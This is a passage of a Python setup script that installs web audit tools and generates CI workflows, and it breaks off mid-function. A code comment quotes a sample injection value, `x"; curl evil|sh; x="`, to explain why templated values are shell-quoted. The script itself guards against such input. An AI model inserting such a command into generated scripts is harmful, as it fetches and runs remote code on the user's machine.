#!/usr/bin/env python3
"""audit-setup kit: detect, install and scaffold the audit tools /review-stack consumes.

Python 3.9+ standard library only. Every command takes --project-dir (default: current
directory) and is idempotent: a tool that is already set up is skipped unless --force.

  audit_kit.py status                      preflight report, changes nothing
  audit_kit.py run [--only TOOL] [...]     set up every missing tool, then write ops/audit/STATUS.md
  audit_kit.py lighthouse [...]            Lighthouse baseline (median of N runs per route)
  audit_kit.py axe [--routes "/ /a"]       @axe-core/playwright + starter spec
  audit_kit.py bundle                      bundle analyzer for the detected framework
  audit_kit.py knip                        knip + starter config + dead-code script
  audit_kit.py quality-ci [...]            PR-time gate: .github/workflows/ci.yml + Dependabot auto-merge
  audit_kit.py lighthouse-ci [...]         Lighthouse-on-PR workflow (needs a baseline)
  audit_kit.py routes                      print detected routes

Exit codes: 0 done or nothing to do, 1 a setup or check failed, 2 cannot run here.
"""

from __future__ import annotations

import argparse
import datetime
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request
from pathlib import Path
from urllib.parse import urlparse

HERE = Path(__file__).resolve().parent
REFS = HERE.parent / "references"
sys.path.insert(0, str(HERE))
import lh_baseline  # noqa: E402

QCI_SENTINEL = "audit-setup:quality-ci v1"
LHCI_SENTINEL = "audit-setup:lighthouse-ci v1"
LH_BLESS_SENTINEL = "audit-setup:lh-bless v1"
PW_CONFIGS = (
    "playwright.config.ts",
    "playwright.config.js",
    "playwright.config.mjs",
    "playwright.config.cjs",
)
TOOLS = ("lighthouse", "axe", "bundle", "knip", "quality-ci", "ci")


class SetupError(Exception):
    """A step failed in a way the user must see. Message says what to do next."""


# --------------------------------------------------------------------------- detection


def read_pkg(root: Path) -> dict:
    """{} when package.json is simply absent (many callers treat that as "nothing
    installed yet"), but a malformed or unreadable one is a named SetupError: a silent
    {} there looks exactly like an empty project and hides a real problem."""
    path = root / "package.json"
    if not path.exists():
        return {}
    try:
        text = path.read_text()
    except OSError as exc:
        raise SetupError(f"cannot read package.json: {exc}") from exc
    try:
        return json.loads(text)
    except ValueError as exc:
        raise SetupError(f"malformed package.json: {exc}") from exc


def has_dep(root: Path, name: str) -> bool:
    """True when name is a dependency or devDependency KEY. A text grep for "knip" also
    matches the script value `"dead-code": "knip"` and reports a tool that is not installed."""
    pkg = read_pkg(root)
    return name in (pkg.get("dependencies") or {}) or name in (
        pkg.get("devDependencies") or {}
    )


def detect_pm(root: Path) -> str:
    if (root / "pnpm-lock.yaml").exists():
        return "pnpm"
    if (root / "yarn.lock").exists():
        return "yarn"
    if (root / "bun.lockb").exists() or (root / "bun.lock").exists():
        return "bun"
    return "npm"


def pm_run(root: Path, script: str) -> str:
    """The command that runs a package.json script, so pnpm, yarn and bun users are not told `npm run`."""
    return {
        "npm": f"npm run {script}",
        "pnpm": f"pnpm {script}",
        "yarn": f"yarn {script}",
        "bun": f"bun run {script}",
    }[detect_pm(root)]


def detect_framework(root: Path) -> str:
    fw = "unknown"
    if any((root / f"next.config.{e}").exists() for e in ("ts", "js", "mjs")):
        fw = "next"
    if any((root / f"vite.config.{e}").exists() for e in ("ts", "js", "mjs")):
        fw = "vite"
    if any((root / f"astro.config.{e}").exists() for e in ("ts", "js", "mjs")):
        fw = "astro"
    return fw


def node_version() -> tuple:
    try:
        out = subprocess.run(
            ["node", "--version"], capture_output=True, text=True
        ).stdout.strip()
    except OSError:
        return (0, 0)
    m = re.match(r"v(\d+)\.(\d+)", out)
    return (int(m.group(1)), int(m.group(2))) if m else (0, 0)


def lighthouse_pkg(node: tuple) -> str:
    """Lighthouse 13 needs Node 22.19 or newer. 12.6.1 is the last release for older Node."""
    return "lighthouse@^13" if node >= (22, 19) else "lighthouse@12.6.1"


def playwright_test_dir(root: Path) -> str:
    """Where Playwright looks for specs. Projects with testDir 'e2e' or 'src/tests' must not be
    reported as missing the a11y spec, and the spec must land where Playwright will find it."""
    for cfg in PW_CONFIGS:
        p = root / cfg
        if p.exists():
            m = re.search(
                r"testDir:\s*['\"]([^'\"]+)['\"]", p.read_text(errors="replace")
            )
            if m:
                d = m.group(1)
                return d[2:] if d.startswith("./") else d
    return "tests"


def axe_spec_present(root: Path) -> bool:
    base = root / playwright_test_dir(root)
    return any(base.glob("a11y/*.spec.*")) or any(base.glob("accessibility/*.spec.*"))


def baseline_count(root: Path) -> int:
    return len(list((root / "ops/lighthouse/baseline").glob("*.report.json")))


def has_sentinel(path: Path, sentinel: str) -> bool:
    return path.is_file() and sentinel in path.read_text(errors="replace")


def clobber_guard(
    root: Path, path: Path, sentinel: str, force: bool, label: str
) -> bool:
    """True when the caller should (re)write `path`. Shared by every install path
    (quality-ci, lighthouse-ci) so "refuse to clobber a hand-written file" is one rule,
    not a copy per tool. --force always proceeds. A missing file always proceeds. An
    existing file we own (sentinel present) is reported and skipped, not overwritten
    silently. An existing file without our sentinel is hand-written: refuse loudly."""
    if not path.exists() or force:
        return True
    if has_sentinel(path, sentinel):
        print(f"{label}: {path.relative_to(root)} already scaffolded (use --force)")
        return False
    raise SetupError(
        f"{path.relative_to(root)} exists without the sentinel (hand-written). "
        "Refusing to overwrite; use --force."
    )


def detect_routes(root: Path, limit: int = 4) -> list:
    """Static top-level routes from the Next.js app or pages router. Dynamic ([id]) and group
    ((marketing)) folders are skipped. Falls back to '/'."""
    routes = ["/"]
    for base in ("src/app", "app"):
        d = root / base
        if d.is_dir():
            for page in sorted(d.glob("*/page.*")):
                name = page.parent.name
                if (
                    page.suffix in (".tsx", ".ts", ".jsx", ".js")
                    and "[" not in name
                    and "(" not in name
                ):
                    routes.append(f"/{name}")
            break
    else:
        for base in ("src/pages", "pages"):
            d = root / base
            if d.is_dir():
                for page in sorted(d.glob("*.*")):
                    stem = page.stem
                    if (
                        page.suffix in (".tsx", ".ts", ".jsx", ".js")
                        and not stem.startswith("_")
                        and "[" not in stem
                        and stem not in ("index", "api")
                    ):
                        routes.append(f"/{stem}")
                break
    return routes[: limit + 1]


def status(root: Path) -> dict:
    node = node_version()
    bundle = "missing"
    for dep in ("@next/bundle-analyzer", "rollup-plugin-visualizer", "size-limit"):
        if has_dep(root, dep):
            bundle = f"installed ({dep})"
    knip = "missing"
    if has_dep(root, "knip"):
        knip = "installed"
    if (root / "knip.json").exists() or (root / "knip.ts").exists():
        knip = "installed + config" if knip == "installed" else "config only"
    wf = root / ".github/workflows/lighthouse-ci.yml"
    ci = (
        "missing"
        if not wf.exists()
        else (
            "present (scaffolded)"
            if has_sentinel(wf, LHCI_SENTINEL)
            else "present (hand-written)"
        )
    )
    qwf = root / ".github/workflows/ci.yml"
    qci = (
        "missing"
        if not qwf.exists()
        else (
            "present (scaffolded)"
            if has_sentinel(qwf, QCI_SENTINEL)
            else "present (hand-written)"
        )
    )
    n = baseline_count(root)
    return {
        "project": str(root),
        "package_json": (root / "package.json").exists(),
        "framework": detect_framework(root),
        "package_manager": detect_pm(root),
        "node": "missing" if node == (0, 0) else f"v{node[0]}.{node[1]}",
        "lighthouse_target": lighthouse_pkg(node),
        "lighthouse": "installed" if has_dep(root, "lighthouse") else "missing",
        "baseline": f"present ({n} routes)" if n else "missing",
        "axe": "installed" if has_dep(root, "@axe-core/playwright") else "missing",
        "axe_spec": "present" if axe_spec_present(root) else "missing",
        "playwright_test_dir": playwright_test_dir(root),
        "bundle": bundle,
        "knip": knip,
        "quality_ci": qci,
        "lighthouse_ci": ci,
    }


def print_status(s: dict) -> None:
    print("Audit Setup - Preflight")
    print(f"  project:        {s['project']}")
    print(
        f"  framework:      {s['framework']}   package manager: {s['package_manager']}"
    )
    print(
        f"  node:           {s['node']}   (Lighthouse to install: {s['lighthouse_target']})"
    )
    print(f"  lighthouse:     {s['lighthouse']}   baseline: {s['baseline']}")
    print(
        f"  axe:            {s['axe']}   spec: {s['axe_spec']} (testDir {s['playwright_test_dir']})"
    )
    print(f"  bundle:         {s['bundle']}")
    print(f"  knip:           {s['knip']}")
    print(f"  quality ci:     {s['quality_ci']}")
    print(f"  lighthouse ci:  {s['lighthouse_ci']}")


# --------------------------------------------------------------------------- actions


def sh(cmd: list, root: Path, check: bool = True) -> int:
    print("  $ " + " ".join(cmd))
    r = subprocess.run(cmd, cwd=root)
    if check and r.returncode != 0:
        raise SetupError(f"command failed ({r.returncode}): {' '.join(cmd)}")
    return r.returncode


def install_dev(root: Path, pkg: str) -> None:
    """Install a devDependency with the project's package manager. npm retries once with
    --legacy-peer-deps on failure: ERESOLVE peer conflicts are the common npm-only breakage,
    and npm's installer also breaks on a node_modules tree that pnpm built."""
    pm = detect_pm(root)
    if pm == "pnpm":
        sh(["pnpm", "add", "-D", pkg], root)
    elif pm == "yarn":
        sh(["yarn", "add", "--dev", pkg], root)
    elif pm == "bun":
        sh(["bun", "add", "-d", pkg], root)
    elif sh(["npm", "install", "--save-dev", pkg], root, check=False) != 0:
        print(
            f"  install of {pkg} failed; retrying with --legacy-peer-deps",
            file=sys.stderr,
        )
        sh(["npm", "install", "--save-dev", "--legacy-peer-deps", pkg], root)


def ensure_dev(root: Path, pkg: str, force: bool = False) -> None:
    name = pkg if not pkg[1:].count("@") else pkg[: pkg.rindex("@")]
    if has_dep(root, name) and not force:
        print(f"  {name}: already installed")
        return
    install_dev(root, pkg)


def add_script(root: Path, name: str, cmd: str) -> bool:
    """Add a package.json script if absent. Never replaces an existing script."""
    path = root / "package.json"
    pkg = json.loads(path.read_text())
    scripts = pkg.setdefault("scripts", {})
    if name in scripts:
        return False
    scripts[name] = cmd
    path.write_text(json.dumps(pkg, indent=2) + "\n")
    print(f"  added package.json script '{name}'")
    return True


def require_node_project(root: Path) -> None:
    if not (root / "package.json").exists():
        raise SetupError(
            "Not a Node project: no package.json. Run from a package root or pass --project-dir."
        )


def require_node18() -> None:
    if node_version() < (18, 0):
        raise SetupError(
            "Node 18 or newer is required for current Lighthouse and axe. Upgrade Node first."
        )


def find_chrome(root: Path = None) -> str:
    if os.environ.get("CHROME_PATH"):
        return os.environ["CHROME_PATH"]
    mac = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    if Path(mac).exists():
        return mac
    for name in ("google-chrome", "chromium", "chromium-browser"):
        found = shutil.which(name)
        if found:
            return found
    if root is not None:
        try:
            probe = subprocess.run(
                [
                    "node",
                    "-e",
                    "for (const m of ['playwright', '@playwright/test']) { try { console.log(require(m).chromium.executablePath()); process.exit(0); } catch {} } process.exit(1);",
                ],
                cwd=root,
                capture_output=True,
                text=True,
                timeout=10,
            )
            candidate = probe.stdout.strip()
            if probe.returncode == 0 and candidate and Path(candidate).is_file():
                return candidate
        except (OSError, subprocess.TimeoutExpired):
            pass
    raise SetupError(
        "Chrome or Chromium not found. Set CHROME_PATH, or install one (npx playwright install chromium works)."
    )


def url_up(url: str) -> bool:
    try:
        with urllib.request.urlopen(url, timeout=3) as r:  # noqa: S310 - local or user-given URL
            return r.status < 500
    except Exception:  # noqa: BLE001 - any failure means "not up"
        return False


def require_unlocked_lighthouse(root: Path) -> None:
    lock = root / "ops/lighthouse/.baseline.publish-lock"
    if lock.exists() or lock.is_symlink():
        raise SetupError(
            f"Lighthouse publication lock needs manual recovery: {lock}. "
            "Inspect the unfinished publication before retrying, including with --force."
        )


def setup_lighthouse(
    root: Path,
    target_url: str = "",
    routes: str = "",
    runs: int = 3,
    force: bool = False,
) -> None:
    base = root / "ops/lighthouse/baseline"
    require_unlocked_lighthouse(root)
    require_node_project(root)
    require_node18()
    n = baseline_count(root)
    if (n or (base / ".capture-proof.json").exists()) and not force:
        helper = root / "ops/lighthouse/lh_baseline.py"
        if not lh_baseline.published_baseline_valid(base):
            raise SetupError(
                "existing Lighthouse baseline is invalid; recapture with --force"
            )
        if (
            not helper.is_file()
            or helper.read_bytes() != (HERE / "lh_baseline.py").read_bytes()
        ):
            raise SetupError(
                "existing Lighthouse helper is stale; recapture with --force"
            )
        print(
            f"lighthouse: baseline already present ({n} routes). Use --force to recapture."
        )
        return
    node = node_version()
    pkg = lighthouse_pkg(node)
    if pkg.endswith("12.6.1"):
        print(
            f"lighthouse: Node v{node[0]}.{node[1]}, pinning {pkg} (Lighthouse 13 needs Node 22.19+)"
        )
    ensure_dev(root, pkg)
    chrome = find_chrome(root)
    route_list = routes.split() if routes else detect_routes(root)
    print(f"lighthouse: routes {' '.join(route_list)}")

    server = None
    log = None
    try:
        if not target_url:
            target_url = (
                os.environ.get("LH_TARGET_URL")
                or os.environ.get("PREVIEW_URL")
                or os.environ.get("VERCEL_PREVIEW_URL")
                or ""
            )
            if target_url:
                print(f"lighthouse: using preview URL {target_url}")
        if not target_url and url_up("http://localhost:3000/"):
            target_url = "http://localhost:3000"
            print("lighthouse: using the server already running on localhost:3000")
        if not target_url:
            print(
                "lighthouse: no server running; building and starting the production server"
            )
            sh(pm_run(root, "build").split(), root)
            log = tempfile.NamedTemporaryFile(
                prefix="lh-server-", suffix=".log", delete=False
            )
            server = subprocess.Popen(
                pm_run(root, "start").split(),
                cwd=root,
                stdout=log,
                stderr=subprocess.STDOUT,
            )
            for _ in range(30):
                if url_up("http://localhost:3000/"):
                    target_url = "http://localhost:3000"
                    break
                time.sleep(1)
            if not target_url:
                raise SetupError(
                    f"local server did not answer on :3000 within 30s (log: {log.name}). Pass --target-url or set PREVIEW_URL."
                )
        write_baseline_files(root, target_url.rstrip("/"), " ".join(route_list), runs)
        env = dict(
            os.environ,
            CHROME_PATH=chrome,
            LH_TARGET_URL=target_url.rstrip("/"),
            LH_ROUTES=" ".join(route_list),
            LH_RUNS=str(runs),
        )
        r = subprocess.run(["sh", "ops/lighthouse/run-baseline.sh"], cwd=root, env=env)
        if r.returncode != 0 or baseline_count(root) == 0:
            raise SetupError(
                "Lighthouse produced no baseline reports. Check the target URL answers and Chrome runs headless."
            )
    finally:
        if server is not None:
            server.terminate()
            try:
                server.wait(timeout=10)
            except subprocess.TimeoutExpired:
                server.kill()
    print(
        f"lighthouse: baseline written to ops/lighthouse/baseline/ ({baseline_count(root)} routes)"
    )


def _validate_lighthouse_target_url(target_url: str) -> None:
    """The target URL lands in the *source* of a committed, later-re-executed shell
    script (see write_baseline_files). shlex.quote makes shell metacharacters inert,
    but it keeps a raw newline inside its single quotes, and a newline in the
    template's comment line (which is substituted like everything else) splits that
    comment across two lines, turning the second into executable shell. Reject
    control characters and require a real http(s) URL before it ever reaches
    substitution. Ordinary shell metacharacters (spaces, quotes, semicolons) are
    left alone; shlex.quote already renders those inert."""
    if not target_url or re.search(r"[\x00-\x1f\x7f]", target_url):
        raise SetupError(
            f"invalid --target-url/PREVIEW_URL {target_url!r}: no control characters (newlines, tabs, etc.) allowed"
        )
    parsed = urlparse(target_url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise SetupError(
            f"invalid --target-url/PREVIEW_URL {target_url!r}: must be an http:// or https:// URL"
        )


def append_lighthouse_exclusions(directory: Path, patterns: tuple) -> None:
    ignore = directory / ".gitignore"
    existing = ignore.read_text() if ignore.exists() else ""
    additions = [
        pattern for pattern in patterns if pattern not in existing.splitlines()
    ]
    if additions:
        prefix = existing + ("\n" if existing and not existing.endswith("\n") else "")
        ignore.write_text(prefix + "\n".join(additions) + "\n")


def backup_lighthouse_files(directory: Path, names: tuple) -> None:
    existing = [directory / name for name in names if (directory / name).exists()]
    if existing:
        backup = Path(tempfile.mkdtemp(prefix=".audit-setup-backup-", dir=directory))
        for source in existing:
            shutil.copy2(source, backup / source.name)
        append_lighthouse_exclusions(directory, (".audit-setup-backup-*/",))
        print(f"lighthouse: retained replaced files at {backup}")


def write_baseline_files(root: Path, target_url: str, routes: str, runs: int) -> None:
    """Commit-ready rerun kit: run-baseline.sh, a copy of lh_baseline.py (so reruns and CI never
    depend on where this skill is installed) and a .gitignore for raw runs."""
    _validate_lighthouse_target_url(target_url)
    out = root / "ops/lighthouse"
    out.mkdir(parents=True, exist_ok=True)
    text = (REFS / "run-baseline.sh.tmpl").read_text()
    # shlex.quote (not a raw .replace()) is load-bearing: target_url/routes are
    # attacker-or-environment controlled (--target-url, --routes, PREVIEW_URL) and land
    # in the *source* of a committed, later-re-executed shell script. A bare .replace()
    # lets a value like `x"; curl evil|sh; x="` break out of quoting at generation time.
    # A single regex pass (not chained str.replace calls) keeps the substitution from
    # re-scanning its own output, so a URL or route containing the literal text
    # "__ROUTES__" cannot be rewritten a second time by a later replacement.
    subs = {
        "__TARGET_URL__": shlex.quote(target_url),
        "__ROUTES__": shlex.quote(routes),
        "__RUNS__": str(int(runs)),
    }
    text = re.sub(
        "|".join(re.escape(k) for k in subs), lambda m: subs[m.group(0)], text
    )
    script = out / "run-baseline.sh"
    backup_lighthouse_files(out, ("run-baseline.sh", "lh_baseline.py"))
    script.write_text(text)
    script.chmod(0o755)
    shutil.copyfile(HERE / "lh_baseline.py", out / "lh_baseline.py")
    append_lighthouse_exclusions(
        out,
        (
            "baseline/.raw/",
            "baseline/*.report.html",
            "baseline/*.log",
            ".audit-setup-backup-*/",
        ),
    )


def render_axe_spec(starter: str, routes: list) -> str:
    entries = []
    for r in routes:
        name = r.strip("/").replace("/", "-") or "home"
        # json.dumps, not an f-string with raw quotes: name/path can come from a
        # detected route folder or --routes on a third-party repo, and a quote or
        # backtick in either must stay inert text, never break out into executable JS.
        entries.append(f"  {{ name: {json.dumps(name)}, path: {json.dumps(r)} }},")
    block = "\n".join(entries) + "\n"
    out, n = re.subn(
        r"(const ROUTES:[^=]*=\s*\[)([\s\S]*?)(\];)",
        lambda m: m.group(1) + "\n" + block + m.group(3),
        starter,
        count=1,
    )
    if n != 1:
        raise SetupError("starter spec has no ROUTES array to fill")
    return out


def setup_axe(root: Path, routes: str = "", force: bool = False) -> None:
    require_node_project(root)
    require_node18()
    ensure_dev(root, "@playwright/test")
    ensure_dev(root, "@axe-core/playwright")
    # Without a browser, a new project fails its first run with "Executable doesn't exist".
    # The install is idempotent and skips browsers already cached.
    if sh(["npx", "playwright", "install", "chromium"], root, check=False) != 0:
        print(
            "axe: warning: browser install failed; run it yourself: npx playwright install chromium"
        )
    if not any((root / c).exists() for c in PW_CONFIGS):
        # With no config, `playwright test --grep @a11y` finds 0 tests on a new project.
        shutil.copyfile(
            REFS / "playwright.config.example.ts", root / "playwright.config.ts"
        )
        print("axe: wrote playwright.config.ts (none existed)")
    test_dir = playwright_test_dir(root)
    target = root / test_dir / "a11y" / "smoke.spec.ts"
    if target.exists() and not force:
        print(
            f"axe: {target.relative_to(root)} already exists (use --force to overwrite)"
        )
        return
    target.parent.mkdir(parents=True, exist_ok=True)
    route_list = routes.split() if routes else detect_routes(root)
    target.write_text(
        render_axe_spec(
            (REFS / "axe-playwright-starter.spec.ts").read_text(), route_list
        )
    )
    print(
        f"axe: wrote {target.relative_to(root)} ({len(route_list)} routes). Run: npx playwright test --grep @a11y"
    )


def snippet_section(heading: str) -> str:
    text = (REFS / "bundle-analyzer.md").read_text()
    m = re.search(rf"^## {re.escape(heading)}\n(.*?)(?=^## |\Z)", text, re.S | re.M)
    return m.group(1).strip() + "\n" if m else text


def setup_bundle(root: Path, force: bool = False) -> None:
    """Never edits next.config or vite.config: they vary too much to patch safely, and a wrong
    patch breaks the build. Writes the snippet to ops/audit/ and prints it for the user."""
    require_node_project(root)
    fw = detect_framework(root)
    if fw == "unknown":
        raise SetupError(
            "bundle analyzer needs Next.js, Vite or a known build; skipping (no framework detected)."
        )
    snippet_file = root / "ops/audit/bundle-analyzer-snippet.md"
    if fw == "next":
        ensure_dev(root, "@next/bundle-analyzer", force)
        add_script(root, "analyze", "ANALYZE=true " + pm_run(root, "build"))
        body = snippet_section("Next.js")
    elif fw == "vite":
        ensure_dev(root, "rollup-plugin-visualizer", force)
        body = snippet_section("Vite")
    else:
        ensure_dev(root, "size-limit", force)
        ensure_dev(root, "@size-limit/preset-app", force)
        cfg = root / ".size-limit.json"
        if not cfg.exists():
            cfg.write_text(
                '[\n  {\n    "name": "main bundle",\n    "path": "dist/**/*.js",\n    "limit": "250 KB"\n  }\n]\n'
            )
            print(
                "bundle: wrote .size-limit.json (adjust path and limit to your build output)"
            )
        print("bundle: run with npx size-limit")
        return
    snippet_file.parent.mkdir(parents=True, exist_ok=True)
    snippet_file.write_text(body)
    print("-" * 60)
    print(
        f"ACTION REQUIRED: add this to your {fw} config (also saved at ops/audit/bundle-analyzer-snippet.md)"
    )
    print("-" * 60)
    print(body)
    if fw == "next":
        print(f"Then run: {pm_run(root, 'analyze')}")


def setup_knip(root: Path, force: bool = False) -> None:
    require_node_project(root)
    ensure_dev(root, "knip", force)
    if ((root / "knip.json").exists() or (root / "knip.ts").exists()) and not force:
        print("knip: config already present")
    elif detect_framework(root) == "next":
        shutil.copyfile(REFS / "knip.example.json", root / "knip.json")
        print("knip: wrote knip.json (Next.js preset)")
    else:
        (root / "knip.json").write_text(
            '{\n  "$schema": "https://unpkg.com/knip@6/schema.json",\n'
            '  "entry": ["src/index.{ts,tsx,js,jsx}", "src/main.{ts,tsx,js,jsx}"],\n'
            '  "project": ["src/**/*.{ts,tsx,js,jsx}"]\n}\n'
        )
        print(
            "knip: wrote knip.json (generic preset; tune entry and project globs to your layout)"
        )
    add_script(root, "dead-code", "knip")
    print("knip: run with npx knip")


# --------------------------------------------------------------------------- quality CI


def quality_ci(
    root: Path,
    workdir: str = "",
    node: str = "",
    branch: str = "",
    force: bool = False,
    dry_run: bool = False,
    uninstall: bool = False,
) -> None:
    files = [
        root / ".github/workflows/ci.yml",
        root / ".github/workflows/dependabot-auto-merge.yml",
    ]
    if uninstall and dry_run:
        print("quality-ci --dry-run: would remove owned workflows")
        return
    if uninstall:
        for f in files:
            if has_sentinel(f, QCI_SENTINEL):
                f.unlink()
                print(f"removed {f.relative_to(root)}")
            else:
                print(f"kept {f.relative_to(root)} (missing or no sentinel)")
        return
    if not workdir:
        for cand in (".", "web", "app"):
            if (root / cand / "package.json").exists():
                workdir = cand
                break
        else:
            raise SetupError("no package.json at ., web/ or app/; pass --workdir")
    pkg_path = root / workdir / "package.json"
    if not pkg_path.exists():
        raise SetupError(f"missing {pkg_path}")
    pkg = json.loads(pkg_path.read_text())
    scripts = pkg.get("scripts") or {}
    deps = {**(pkg.get("dependencies") or {}), **(pkg.get("devDependencies") or {})}
    test_script = (
        "test:coverage"
        if "test:coverage" in scripts
        else ("test" if "test" in scripts else "")
    )
    if not test_script:
        raise SetupError(
            f"no test script in {pkg_path}. Add one first (vitest, jest, node --test). A gate with no tests is theater."
        )
    if not node:
        m = re.search(r"(\d+)", (pkg.get("engines") or {}).get("node", "") or "")
        node = m.group(1) if m else "22"
    if not branch:
        r = subprocess.run(
            ["git", "symbolic-ref", "--short", "refs/remotes/origin/HEAD"],
            cwd=root,
            capture_output=True,
            text=True,
        )
        branch = r.stdout.strip().replace("origin/", "") or "main"
    wd = root / workdir
    if (wd / "pnpm-lock.yaml").exists():
        pm, install, lock, run, audit = (
            "pnpm",
            "pnpm install --frozen-lockfile",
            "pnpm-lock.yaml",
            "pnpm",
            "pnpm audit --audit-level=high --prod",
        )
    elif (wd / "yarn.lock").exists():
        # Yarn Berry (2+) marks itself with .yarnrc.yml (Classic never writes one).
        # Berry's lockfile flag is --immutable (--frozen-lockfile is Classic-only and
        # is silently accepted but not honored by Berry), and `yarn npm audit` is a
        # Berry-only subcommand; Classic uses `yarn audit --level`.
        if (wd / ".yarnrc.yml").exists():
            pm, install, lock, run, audit = (
                "yarn",
                "yarn install --immutable",
                "yarn.lock",
                "yarn",
                "yarn npm audit --severity high",
            )
        else:
            pm, install, lock, run, audit = (
                "yarn",
                "yarn install --frozen-lockfile",
                "yarn.lock",
                "yarn",
                "yarn audit --level high",
            )
    elif (wd / "bun.lockb").exists() or (wd / "bun.lock").exists():
        # `bun run test` / `bun run build`, never bare `bun test`/`bun build`: those
        # are Bun's own built-in test runner and bundler, not the package.json script.
        pm, install, lock, run, audit = (
            "bun",
            "bun install --frozen-lockfile",
            "bun.lock" if (wd / "bun.lock").exists() else "bun.lockb",
            "bun run",
            "bun audit",
        )
    else:
        pm, install, lock, run, audit = (
            "npm",
            "npm ci",
            "package-lock.json",
            "npm run",
            "npm audit --audit-level=high --omit=dev",
        )
    lockfile = lock if workdir == "." else f"{workdir}/{lock}"
    typecheck = ""
    if "typescript" in deps:
        # Next 16 generates PageProps/LayoutProps into .next/types at build time. A bare
        # `tsc --noEmit` on a fresh runner cannot find them. Measured 2026-09-05: 8 TS2304 errors
        # on a clean runner that never showed locally, where .next/types was left from a build.
        if "next" in deps:
            typecheck = "      - name: TypeScript\n        run: |\n          npx next typegen\n          npx tsc --noEmit"
        else:
            typecheck = "      - name: TypeScript\n        run: npx tsc --noEmit"
    build = ""
    if "build" in scripts:
        build = f"      - name: Production build\n        # Add dummy env here if the build reads variables; never real secrets.\n        run: {run} build"
    values = {
        "__DEFAULT_BRANCH__": branch,
        "__WORKDIR__": workdir,
        "__NODE__": node,
        # actions/setup-node's built-in `cache:` only understands npm, yarn, pnpm.
        # Bun has no cache action here (use oven-sh/setup-bun separately if needed);
        # an empty string is setup-node's own "no caching" default, not an error.
        "__PM__": "" if pm == "bun" else pm,
        "__LOCKFILE__": lockfile,
        "__INSTALL__": install,
        "__TEST_CMD__": f"{run} {test_script}",
        "__AUDIT_CMD__": audit,
        "__TYPECHECK_STEP__": typecheck,
        "__BUILD_STEP__": build,
        "__WORKDIR_RE__": "" if workdir == "." else re.escape(workdir) + "/",
    }

    def render(name: str) -> str:
        t = (REFS / name).read_text()
        for k, v in values.items():
            t = t.replace(k, v)
        return re.sub(r"\n\n+(?=      - name)", "\n", t)

    write_files = {
        f: clobber_guard(root, f, QCI_SENTINEL, force, "quality-ci") for f in files
    }
    ci_body, dam_body = (
        render("quality-ci.yml.tmpl"),
        render("dependabot-auto-merge.yml.tmpl"),
    )
    if dry_run:
        print(
            f"quality-ci --dry-run: workdir={workdir} node={node} pm={pm} branch={branch} test='{run} {test_script}' build={'yes' if build else 'no'} typescript={'yes' if typecheck else 'no'}"
        )
        print("--- .github/workflows/ci.yml ---")
        print(ci_body)
        return
    files[0].parent.mkdir(parents=True, exist_ok=True)
    for path, body in zip(files, (ci_body, dam_body)):
        if write_files[path]:
            path.write_text(body)
    dep_cfg = root / ".github/dependabot.yml"
    if not dep_cfg.exists():
        directory = "/" if workdir == "." else f"/{workdir}"
        dep_cfg.write_text(
            "version: 2\nupdates:\n"
            f'  - package-ecosystem: npm\n    directory: "{directory}"\n'
            '    schedule: { interval: weekly, day: monday, time: "09:00" }\n'
            "    open-pull-requests-limit: 10\n"
            '    commit-message: { prefix: "chore(deps)", include: scope }\n'
            '  - package-ecosystem: github-actions\n    directory: "/"\n'
            '    schedule: { interval: weekly, day: monday, time: "09:00" }\n'
            '    commit-message: { prefix: "chore(ci)", include: scope }\n'
        )
        print("quality-ci: wrote .github/dependabot.yml")
    print(
        f"quality-ci: wrote .github/workflows/ci.yml and dependabot-auto-merge.yml (workdir={workdir} node={node} pm={pm})"
    )
    if shutil.which("zizmor"):
        subprocess.run(["zizmor", "--no-progress", ".github/workflows"], cwd=root)
    remote = subprocess.run(
        ["git", "remote", "get-url", "origin"], cwd=root, capture_output=True, text=True
    ).stdout.strip()
    m = re.search(r"github\.com[:/]([^/]+/[^/]+?)(?:\.git)?$", remote)
    slug = m.group(1) if m else "OWNER/REPO"
    print(
        f"""
Next, after the first green `ci` run on {branch}, make it a required check (repository ruleset):
  gh api -X POST repos/{slug}/rulesets --input - <<'JSON'
  {{"name":"{branch}: ci required","target":"branch","enforcement":"active",
   "conditions":{{"ref_name":{{"include":["~DEFAULT_BRANCH"],"exclude":[]}}}},
   "rules":[{{"type":"deletion"}},{{"type":"non_fast_forward"}},
            {{"type":"required_status_checks","parameters":{{"strict_required_status_checks_policy":false,"required_status_checks":[{{"context":"ci"}}]}}}}]}}
JSON
Confirm it took: gh api repos/{slug}/rulesets"""
    )


# --------------------------------------------------------------------------- Lighthouse CI


def lighthouse_ci(
    root: Path,
    force: bool = False,
    dry_run: bool = False,
    regen_only: bool = False,
    enforce: bool = False,
    uninstall: bool = False,
    allow_hosts: list = None,
) -> None:
    wf = root / ".github/workflows/lighthouse-ci.yml"
    # (path, its own sentinel): lh-bless.sh carries a distinct sentinel from the
    # workflow/README/.lighthouserc.json, so a file hand-edited by the user is
    # detected and kept even when its siblings are still ours to delete.
    owned = [
        (wf, LHCI_SENTINEL),
        (root / ".github/ci/lh-bless.sh", LH_BLESS_SENTINEL),
        (root / ".github/ci/README.md", LHCI_SENTINEL),
        (root / ".lighthouserc.json", LHCI_SENTINEL),
    ]
    if uninstall and dry_run:
        print(
            "lighthouse-ci --dry-run: would remove owned files and unchanged package scripts"
        )
        return
    if uninstall:
        kept = []
        for f, sentinel in owned:
            if not f.exists():
                continue
            if has_sentinel(f, sentinel):
                f.unlink()
                print(f"removed {f.relative_to(root)}")
            else:
                kept.append(f)
                print(f"kept {f.relative_to(root)} (hand-edited: sentinel missing)")
        ci_dir = root / ".github/ci"
        if ci_dir.is_dir() and not any(ci_dir.iterdir()):
            ci_dir.rmdir()
        pkg_path = root / "package.json"
        if pkg_path.exists():
            pkg = json.loads(pkg_path.read_text())
            scripts = pkg.get("scripts") or {}
            # Value match, not just key match: add_script() never overwrites
            # an existing script, so "lhci" or "lh:bless" here may be a
            # user's own pre-existing or hand-edited script under the same
            # name. Only remove it when it still holds exactly what this
            # skill wrote.
            owned_scripts = {
                "lhci": "lhci autorun",
                "lh:bless": "sh .github/ci/lh-bless.sh",
            }
            stripped = [
                k
                for k, v in owned_scripts.items()
                if scripts.get(k) == v and scripts.pop(k, None)
            ]
            if stripped:
                pkg_path.write_text(json.dumps(pkg, indent=2) + "\n")
                print(f"stripped {' and '.join(stripped)} script(s) from package.json")
            kept_scripts = [
